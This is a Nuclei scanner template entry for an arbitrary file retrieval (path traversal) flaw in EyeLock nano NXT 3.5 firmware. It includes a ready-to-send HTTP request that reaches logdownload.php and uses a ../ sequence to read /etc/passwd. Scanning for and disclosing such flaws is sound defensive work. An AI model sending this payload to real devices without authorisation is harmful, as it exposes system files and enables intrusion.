# Nuclei Template: EyeLock nano NXT 3.5 - Arbitrary File Retrieval
**Template ID:** eyelock-nano-lfd
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`eyelock-nano-lfd.yaml`)

## Vulnerability Information & PoC

## Description
EyeLock nano NXT suffers from a file retrieval vulnerability when input passed through the 'path' parameter to 'logdownload.php' script is not properly verified before being used to read files. This can be exploited to disclose contents of files from local resources.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd
```

## References
- https://www.zeroscience.mk/codes/eyelock_lfd.txt
